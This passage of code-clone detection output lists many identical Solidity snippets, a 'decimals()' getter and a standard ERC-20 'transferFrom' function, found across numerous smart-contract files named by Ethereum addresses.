<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="60" endline="62" pcid="173">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="60" endline="62" pcid="1522">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="65" endline="67" pcid="8735">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="65" endline="67" pcid="6626">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="58" endline="60" pcid="2108">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="60" endline="62" pcid="1048">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xAe5A5174359c2c77D60aBCff529308266aa32c5e.sol" startline="61" endline="63" pcid="6317">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="62" endline="64" pcid="3101">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="64" endline="66" pcid="5105">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="59" endline="61" pcid="6072">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="132" endline="134" pcid="6727">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="63" endline="65" pcid="3999">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="62" endline="64" pcid="677">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x60871C6c7c923B61f77C2df7AB15879239FeD83F.sol" startline="61" endline="63" pcid="3665">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xca7d2118fbfaac126a51d403c2f73eff4af97a1a.sol" startline="56" endline="58" pcid="7214">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="60" endline="62" pcid="1594">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe10f1b5466b361c9c8c735021A6d00CDea855763.sol" startline="61" endline="63" pcid="8089">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="63" endline="65" pcid="988">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="59" endline="61" pcid="531">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="62" endline="64" pcid="7634">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0fa38D4bdf91c5C3E4FB66D0125748aA0897683e.sol" startline="60" endline="62" pcid="416">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="62" endline="64" pcid="7711">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="63" endline="65" pcid="4740">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="59" endline="61" pcid="3772">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x508A3908572F7697CF8A13c2A95642122C3Ab43B.sol" startline="61" endline="63" pcid="2959">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="59" endline="61" pcid="5371">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="64" endline="66" pcid="4474">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="60" endline="62" pcid="7294">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="63" endline="65" pcid="2417">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="62" endline="64" pcid="9142">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xAD7052E3511E19a82705E06756cF087A36B68e4a.sol" startline="59" endline="61" pcid="6302">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="65" endline="67" pcid="576">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="59" endline="61" pcid="290">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="58" endline="60" pcid="1144">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
</class>

<class classid="37" nclones="479" nlines="6" similarity="100">
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="91" endline="100" pcid="55">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="90" endline="99" pcid="6721">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="92" endline="101" pcid="407">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="87" endline="96" pcid="5220">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="86" endline="95" pcid="1135">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="85" endline="94" pcid="5407">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="85" endline="94" pcid="6585">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="86" endline="95" pcid="7933">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="85" endline="94" pcid="2114">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="87" endline="96" pcid="70">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="88" endline="97" pcid="863">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="85" endline="94" pcid="4306">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="88" endline="97" pcid="4081">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa149cAa78E7BdE7F564162B17fc98D47B70DA95a.sol" startline="86" endline="95" pcid="5834">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="187" endline="196" pcid="3824">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="87" endline="96" pcid="5051">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="89" endline="98" pcid="8308">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="89" endline="98" pcid="7491">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="89" endline="98" pcid="9025">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="91" endline="100" pcid="4595">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="89" endline="98" pcid="8756">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="88" endline="97" pcid="1298">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="87" endline="96" pcid="1788">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="89" endline="98" pcid="7717">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="87" endline="96" pcid="6338">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="89" endline="98" pcid="1567">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="88" endline="97" pcid="5322">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="705" endline="714" pcid="8080">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="91" endline="100" pcid="4480">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa33ced472a9b6dd99abc6bae53d4a905832e02cf.sol" startline="88" endline="97" pcid="5914">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="87" endline="96" pcid="719">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="85" endline="94" pcid="7208">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x24EdaAAdB4EA4C7aa6CAe4dBB0D0a93C8F5FF180.sol" startline="85" endline="94" pcid="1150">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="85" endline="94" pcid="4065">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="89" endline="98" pcid="1918">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="88" endline="97" pcid="5519">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="89" endline="98" pcid="878">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="88" endline="97" pcid="6169">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="88" endline="97" pcid="7193">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="87" endline="96" pcid="1933">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6123891860a51956182A48145D34179b97bE0077.sol" startline="87" endline="96" pcid="3716">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="85" endline="94" pcid="4137">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="90" endline="99" pcid="7948">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="85" endline="94" pcid="4050">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="86" endline="95" pcid="5883">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="89" endline="98" pcid="4634">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBe43ad4F6F0B27228aC7E54974a57470862FC8Bf.sol" startline="90" endline="99" pcid="6797">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="87" endline="96" pcid="3975">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="99" endline="108" pcid="7732">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCf60d61616a64371DF34580AcE2b13401d29C55c.sol" startline="89" endline="98" pcid="7387">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="88" endline="97" pcid="6782">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="91" endline="100" pcid="8293">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="91" endline="100" pcid="6487">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="89" endline="98" pcid="5564">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="89" endline="98" pcid="1835">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc1143D26004Ec3253eF0aB4500113105164aA789.sol" startline="92" endline="101" pcid="6929">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="88" endline="97" pcid="8536">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="89" endline="98" pcid="4710">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="89" endline="98" pcid="1686">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="89" endline="98" pcid="4336">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="86" endline="95" pcid="8555">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="89" endline="98" pcid="7446">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="88" endline="97" pcid="6767">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="84" endline="93" pcid="5337">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="85" endline="94" pcid="7154">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="88" endline="97" pcid="4610">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="87" endline="96" pcid="6154">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="88" endline="97" pcid="945">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="88" endline="97" pcid="1953">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="413" endline="422" pcid="5286">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="82" endline="91" pcid="7056">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
